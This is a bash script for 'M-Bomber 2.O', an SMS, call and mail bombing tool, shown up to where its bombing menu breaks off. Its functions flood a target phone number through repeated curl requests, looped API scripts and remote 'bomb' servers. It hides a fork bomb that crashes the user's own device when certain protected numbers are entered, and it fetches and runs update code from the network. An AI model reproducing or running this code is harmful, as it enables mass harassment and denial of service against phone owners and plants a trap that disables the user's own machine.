#!/bin/bash
## Coded by the jatin kalwar
##Don't steal my code read license
## if you use any part of code then give me credit

aunt() {
FILE=$HOME/m-bomber2.O/Additional/save.txt
if [ -f "$FILE" ]; then
fix
jat 
#cd $HOME/m-bomber2.O/Additional
#jtext=$(cat save.txt)
#echo $otext
else
tank
fi
}

fix() {
cd $HOME/m-bomber2.O/Additional
jtext=$(cat save.txt)
}

tank() {
 

echo -e "                   \e[31m▒\e[92m█\e[31m░░░ ▒\e[92m█▀▀▀█ \e[31m▒\e[92m█▀▀█ ▀█▀ \e[31m▒\e[92m█▄\e[31m░▒\e[92m█ "
echo -e "                   \e[31m▒\e[92m█\e[31m░░░ ▒\e[92m█\e[31m░░▒\e[92m█ \e[31m▒\e[92m█\e[31m░\e[92m▄▄ \e[31m▒\e[92m█\e[31m░ ▒\e[92m█\e[31m▒\e[92m█\e[31m▒\e[92m█"  
echo -e "                   \e[31m▒\e[92m█▄▄█ \e[31m▒\e[92m█▄▄▄█ \e[31m▒\e[92m█▄▄█ ▄█▄ \e[31m▒\e[92m█\e[31m░░\e[92m▀█"
echo ''





echo -e "\e[31mFill Your Details Correctly , It Will Help Us To Protect You From" | pv -qL 60
echo -e "\e[31m Tracing" | pv -qL 60
echo ''
echo -e  "\e[93mEnter Your Name:- " 
read jelly
echo $jelly >> save.txt
clear
echo ''
echo ''
echo ''
echo -e "\e[93mPlease Wait It Will Take Only Few Minutes. This Is Only One Time"
echo -e "\e[93mProcess After Install."
echo ''
cd $HOME/m-bomber2.O/Additional
bash h1.sh
fix
jat

}

internet() {
    
    wget -q --spider https://github.com/jatinkalwar

if [ $? -eq 0 ]; then
    just
else
    clear
    ban
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi
}
detect_distro() {
   if [[ "$OSTYPE" == linux-android* ]]; then
distro="termux"
   fi   
    if [ -z "$distro" ]; then
distro=$(ls /etc | awk 'match($0, "(.+?)[-_](?:release|version)", groups) {if(groups[1] != "os") {print groups[1]}}')
    fi
if [ -z "$distro" ]; then 
        if [ -f "/etc/os-release" ]; then
distro="$(source /etc/os-release && echo $ID)"
   elif [ "$OSTYPE" == "darwin" ]; then 
      distro="darwin"    
                else 
            distro="invalid"
        fi
    fi
     }
        
        pause() {
    read -n1 -r -p "Press any key to continue..." key
}


cake() {
    
    
secret="update v1.7"
cd $HOME/m-bomber2.O/Additional
ztext=$(cat update.txt)
if [[ $secret = $ztext ]];
then
cd $HOME/m-bomber2.O/Additional
rm update.txt
bash update.sh
else
cd $HOME/m-bomber2.O/Additional
rm update.txt
clear
ake
fi
}


ake() {
ecret="patch v1.5"
cd $HOME/m-bomber2.O/Additional
ztet=$(cat patch.txt)
if [[ $ecret = $ztet ]];
then
cd $HOME/m-bomber2.O/Additional
rm patch.txt
bash patch.sh
else
cd $HOME/m-bomber2.O/Additional
rm patch.txt
clear
aunt
fi
}




ban()  {
clear
 echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@ Master-Bomber2.O @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        JATIN KALWAR
               INSTAGRAM:- YOURHACKINGHOUSE
                    
'
}
upda() {
 
if [ -d "$HOME/m-bomber2.O/Additional" ];
then
cd $HOME/m-bomber2.O/Additional
rm er3.txt
elif [ -d "$HOME/m-bomber2.O/Additional" ];
then
cd $HOME/m-bomber2.O/Additional
rm er3.txt
else
echo
exit 1
fi
clear
cd $HOME
# While process is running...
echo ''
echo ''
echo -e '\e[92m'
echo -e "\e[92m               █▀▄▀█ █▀█\e[31m░    \e[92m█▄▀ ▄▀█ █\e[31m░░ \e[92m█\e[31m░\e[92m█\e[31m░\e[92m█ ▄▀█ █▀█\e[92m"
echo -e "\e[92m               █\e[31m░\e[92m▀\e[31m░\e[92m█ █▀▄ ▄   █\e[31m░\e[92m█ █▀█ █▄▄ ▀▄▀▄▀ █▀█ █▀▄\e[93m"
echo ''
echo ''






echo -e "  \e[92m∆ \e[93mFetching Files From github.com/jatinkalwar, Please Wait..."
sleep 0.5
git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null

cd $HOME
cd toolupdater/error 2> /dev/null
mv er3.txt $HOME/m-bomber2.O/Additional 2> /dev/null
cd $HOME/toolupdater 2> /dev/null
mv update.txt patch.txt .server.txt $HOME/m-bomber2.O/Additional 2> /dev/null
cd $HOME
rm -rf toolupdater 2> /dev/null

}


  upd(){
if [ -d "$HOME/m-bomber2.O" ];
then
cd $HOME
rm -rf m-bomber2.O
elif [ -d "$HOME/m-bomber2.O" ];
then
cd $HOME
rm -rf m-bomber2.O
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mRECLONE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/jatinkalwar/m-bomber2.O 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           RECLONE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd m-bomber2.O
bash bomber.sh
}

        banner() {
    clear
    echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@ Master-Bomber2.O @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        JATIN KALWAR
'
echo -e "                  \e[93mHey!! Welcome \e[32m$jtext \e[93mHacker"
    figlet M-BOMBER 2.O| lolcat
   
    echo -e "\e[31mWARNING :- \e[97mDON'T TRY TO BOMB MY NUMBER OTHERWISE YOUR IP WILL BE BAN"
echo -e "\e[32mThis Bomber Is Created By \e[94mThe Jatin Kalwar" 
    echo -e "\e[32mFor Any Queries Contact Me!!!"
    echo -e "\e[32mFacebook:- \e[94mYourhackinghouse" 
    echo -e "\e[32mInstagram:- \e[94mYourhackinghouse" 
    echo -e "\e[32mJoin our Whatsapp group :- \e[94m+994408609255" 
    echo ' '| lolcat
    echo -e "\e[93mPlease use for Educational Purpose only!!!" 
    echo ' '| lolcat
}
            
            init_environ(){
    declare -A backends; backends=(
        ["arch"]="pacman -S --noconfirm"
        ["debian"]="apt-get -y install"
        ["ubuntu"]="apt -y install"
        ["termux"]="apt -y install"
        ["fedora"]="yum -y install"
        ["redhat"]="yum -y install"
        ["SuSE"]="zypper -n install"
        ["sles"]="zypper -n install"
        ["darwin"]="brew install"
        ["alpine"]="apk add"
    )
                
                INSTALL="${backends[$distro]}"
                
                if [ "$distro" == "termux" ]; then
        PYTHON="python"
        SUDO=""
    else
         PYTHON="python3"
        SUDO="sudo"
    fi
    PIP="$PYTHON -m pip"
}

anonmen() {
cd $HOME/m-bomber2.O
wget -L https://raw.githubusercontent.com/jatinkalwar/toolupdate/main/error/er3.txt 2>/dev/null
ban
figlet M-BOMBER2.O | lolcat
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read  -p "ACCESS KEY: " secret
cd $HOME/m-bomber2.O/Additional
otext=$(cat er3.txt)
cd $HOME
cd $HOME/m-bomber2.O/Additional
anontest
}

    anontest(){
if [[ $secret = $otext ]];
then
auth1
else
clear
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
sleep 5.0
jat
fi
}


    
massbmb(){
clear
ban
figlet Mass Bomber | lolcat 
echo -ne "NUMBER: \e[0m"
read num
if [ "$num" = "9990212082" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "9315215104" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "8750501688" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "8368048122" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "9310290933" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
else
clear
echo -e "\e[93m
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
┃   \e[91mM-B2.O\e[93m  ┃ \e[91m ATTACK-\e[92mMASS BOMBING \e[93m
┃           ┃ \e[93m
┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
┃           ┃
┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/994408609255
╰━━━━━━━━━━━╯
"
killall -9 php >/dev/null 2>&1
cd /data/data/com.termux/files/home/m-bomber2.O/Additional
php -S localhost:8080 >/dev/null 2>&1 &
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
massbmb
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
fi
}


massbmb2(){
    
    PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cp anonapi $PW_WD
cd ..


clear
ban
figlet Mass Bomber | lolcat 
echo -ne "NUMBER: \e[0m"
read targett
if [ "$targett" = "8368048122" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$targett" = "9990212082" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$targett" = "9315215104" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$targett" = "8750501688" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$targett" = "9310290933" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
else
cd $HOME/m-bomber2.O/model
rm tailapis headapis
cd $HOME/m-bomber2.O
rm tailapis headapis
clear
echo -e "\e[93m
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃ \e[91m TARGET-\e[92m$targett \e[93m
┃   \e[91mM-B2.O\e[93m  ┃ \e[91m ATTACK-\e[92mMASS BOMBING \e[93m
┃           ┃ \e[93m
┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
┃           ┃
┃\e[34m"$targett"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/994408609255
╰━━━━━━━━━━━╯
"
cd $HOME/m-bomber2.O/Additional
cp tailapis headapis $HOME/m-bomber2.O/model

cd $HOME/m-bomber2.O/model
cp tailapis headapis $HOME/m-bomber2.O
while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..4}
do bash headapis
done

for i in {1..27}
do bash tailapis
done

cd $HOME/m-bomber2.O/model
rm tailapis headapis
cd $HOME/m-bomber2.O
rm tailapis headapis


echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
massbmb2
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
fi
}

massbmb3() {

clear
ban
figlet Mass Bomber | lolcat
echo -ne "NUMBER: \e[0m"
read num
if [ "$num" = "9990212082" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "9315215104" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "8750501688" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "8368048122" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "9310290933" ];
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
else

clear
echo -e "\e[93m
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
┃   \e[91mM-B2.O\e[93m  ┃ \e[91m ATTACK-\e[92mMASS BOMBING \e[93m
┃           ┃ \e[93m
┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
┃           ┃
┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/994408609255
╰━━━━━━━━━━━╯
"
bombsrvr=$(shuf -n 1 -e https://xlr81.herokuapp.com/bomb https://xlr82.herokuapp.com/bomb https://xlr83.herokuapp.com/bomb https://xlr84.herokuapp.com/bomb https://xlr85.herokuapp.com/bomb https://xlr86.herokuapp.com/bomb)
curl -s "$bombsrvr/$num" >> .output.txt
output=$(cat .output.txt | grep "Fuck you")
if [[ $output = "Fuck you" ]]
then
clear
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mOOPPS SORRY API PROBLEM FIX IT SOON........\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
exit
fi
output=$(cat .output.txt | grep "You can only bomb a number 100 times in a day")
if [[ $output = "You can only bomb a number 100 times in a day" ]]
then
clear
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Bomb Limit Exceeded\e[1;91m ( ͡❛ ︹ ͡❛)\e[93m\n"
echo ""
exit
fi
output=$(cat .output.txt | grep "Number contains non-numeric characters")
if [[ $output = "Number contains non-numeric characters" ]]
then

clear
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Given number contains non-numeric characters !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Please provide 10 digit number")
if [[ $output = "Please provide 10 digit number" ]]
then
clear
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Length of the given number is not 10 !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Bombing Started")
if [[ $output = "Bombing Started" ]]
then
printf "\n"
echo ''

find . -type f -exec sh -c "eval $bombb" \;

sleep 9.0
else

find . -type f -exec sh -c "eval $bombb" \;
sleep 9.0
fi
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
massbmb3
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
fi
}
auth1() {

if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'ANON. SMS' | boxes -d cat -a hc -p h8 | lolcat
        else
clear
        ban
        figlet  Anon. Sms | lolcat
        echo 'Created by The Jatin Kalwar' | lolcat
echo -e "\e[31mYOU CAN SEND ONLY ONE SMS PER DAY"
echo -e "\e[93m WRITE NUMBER WITH COUNTRY CODE FOR EXAMPLE +918888877777"
        fi
         $PYTHON AnonSMS.py 
           }
                
                install_deps(){
    packages=(openssl git ruby boxes $PYTHON $PYTHON-pip figlet toilet boxes)
    if [ -n "$INSTALL" ];then
        for package in ${packages[@]}; do
            $SUDO $INSTALL $package
        done
        $PIP install -r requirements.txt
        if ! gem spec lolcat > /dev/null 2>&1; then
    	git clone https://github.com/busyloop/lolcat
    	cd lolcat
    	cd bin
    	sleep 2
    	gem install lolcat
    	sleep 1
    	cd ..
    	cd ..
    	rm -rf lolcat
    	else
           echo "Can't Install lolcat" 
        fi                        
     else

echo "We could not install dependencies."
        exit
fi
}

jat() {
    clear 
    banner
        echo -e "\e[4;31m Please Read Instruction Carefully !!! \e[0m"
       echo ' '
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Start\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Access Key\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m Buy Access Key\e[93m"
echo -e "\e[92m[\e[91m4\e[92m]\e[93m Visit Our Website\e[93m"
echo -e "\e[92m[\e[91m5\e[92m]\e[93m About Me\e[93m"
echo -e "\e[92m[\e[91m6\e[92m]\e[93m Features\e[93m"
echo -e "\e[92m[\e[91m7\e[92m]\e[93m Reclone Tool\e[93m"
echo -e "\e[92m[\e[91m8\e[92m]\e[93m Logout\e[93m"
echo -e "\e[92m[\e[91m0\e[92m]\e[93m Exit\e[93m"
    read ch
    cd Core
    clear
    if [ $ch -eq 1 ];
    then
   bombs
elif [ $ch -eq 4 ];then
am start -a android.intent.action.VIEW -d https://bit.ly/2QT6dSR > /dev/null 2>&1
clear
banner
jat
 elif [ $ch -eq 2 ];then
ban
echo -e "\e[93mFOLLOW ME ON FACEBOOK AND GITHUB THEN SEND ME SCREENSHOT ON FACEBOOK OR WHATSAPP THEN I WILL GIVE YOU ACCESS KEY..." | pv -qL 10
sleep 5.0
am start -a android.intent.action.VIEW -d https://facebook.com/yourhackinghouse > /dev/null 2>&1
sleep 15.0
clear
ban
termux-open https://github.com/jatinkalwar
clear
jat
elif [ $ch -eq 5 ];then
echo -e '\e[91m
                     ──▐─▌──▐─▌──
                     ─▐▌─▐▌▐▌─▐▌─
                     ─█▄▀▄██▄▀▄█─
                     ──▄──██▌─▄──
                     ▄▀─█▀██▀█─▀▄
                     ▐▌▐▌─▐▌─▐▌▐▌
                     ─▐─█────█─▌─
                     ────▌──▐────
'
echo -e "\e[93m                    CALL ME \e[92mJATT" | pv -qL 10
echo -e "\e[93m               REAL NAME \e[92mJATIN KALWAR" | pv -qL 10
echo -e "\e[93m             IAM FROM \e[92mYOURHACKINGHOUSE" | pv -qL 10
echo -e "\e[93m        IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "\e[93m       HOPE YOU LIKE THIS MASTER BOMBER 2.O" | pv -qL 10
echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
echo -e "\e[93m        MY WEBSITE:\e[92m https://bit.ly/2QT6dSR \e[0m" | pv -qL 10

echo -e "\e[92m                BYEE.............." | pv -qL 10
sleep 8.0
clear
banner
jat
      
  elif [ $ch -eq 6 ];then
        clear
        if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'FEATURES' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  features | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        fi
echo "  [+] Unlimited And Super-Fast Bombing"| lolcat
	echo "  [+] Colourful Interface"| lolcat
	echo "  [+] Anonymous sms" | lolcat
	echo "  [+] SMS Bombing "| lolcat
	echo "  [+] Call Bombing "| lolcat
	echo "  [+] Mail Bombing "| lolcat
	echo "  [+] Custom SMS Sending"| lolcat
	echo "  [+] Easy To Use And Embed in Code"| lolcat
	echo ""
	echo -e "\e[1;31m This Script is Only For Educational Purposes or To Prank.\e[0m"| lolcat
	echo -e "\e[1;31m Do not Use This To Harm Others. \e[0m"| lolcat
	echo -e "\e[1;31m I Am Not Responsible For The Misuse Of The Script. \e[0m"| lolcat
	echo  " "
	echo -e "\e[4;31m That's All !!!\e[0m"| lolcat
	echo -e "\e[4;34m This Bomber Was Created By Jatin kalwar \e[0m" | lolcat
	echo -e "\e[1;34m For Any Queries Contact Me!!!\e[0m"| lolcat
	echo -e "\e[1;32m   Instagram:- Yourhackinghouse\e[0m"| lolcat
	sleep 3.0
	clear
	banner
	jat

elif [ $ch -eq 8 ];then
cd $HOME/m-bomber2.O/Additional
rm save.txt
clear
ban
figlet LOGOUT | lolcat
echo 'BYE....... TATA.........' | lolcat
	
 elif [ $ch -eq 7 ];then
    upd
    elif [ $ch -eq 0 ];then
        ban
        figlet Exit | lolcat
        echo ' BYEEEEEE............ ' | lolcat
        exit
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
}


massserver() {
    clear
        ban
        figlet  Mass bomber | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        
    
        echo -e "\e[92mCHOOSE SERVER"
        echo -e ''
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Server 1\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Server 2\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m Server 3\e[93m"
echo -e "\e[92m[\e[91m4\e[92m]\e[93m Back\e[93m"
read ch
    cd Core
    clear
    if [ $ch -eq 1 ];then
  if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'Mass BOMBER' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  Mass Bomber | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        fi
        massbmb
    
    
elif [ $ch -eq 2 ];then
        clear
  if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'Mass BOMBER' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  Mass Bomber | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        fi
        massbmb2

elif [ $ch -eq 3 ];then
        clear
  if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'Mass BOMBER' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  Mass Bomber | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        fi
        massbmb3

 elif [ $ch -eq 4 ]; then
 bombs
else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
 
  fi
  exit
}


callserver() {
    clear
        ban
        figlet  Call bomber | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        
    
        echo -e "\e[92mCHOOSE SERVER"
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Server 1\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Server 2\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m Back\e[93m"
read ch
    cd Core
    clear
    if [ $ch -eq 1 ];then
  if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'MAIL BOMBER' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  Call bomber | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        fi
        cd $HOME/m-bomber2.O
        $PYTHON Jatin.py --call
    
    
elif [ $ch -eq 2 ];then
        clear
echo 'hieeeee'

 elif [ $ch -eq 3 ]; then
 bombs
else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
 
  fi
  exit
}

bombs() {
    clear
    banner
    echo ' '
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Anonymous Sms\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Mass Bombing\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m Sms Bombing\e[93m"
echo -e "\e[92m[\e[91m4\e[92m]\e[93m Call Bombing\e[93m"
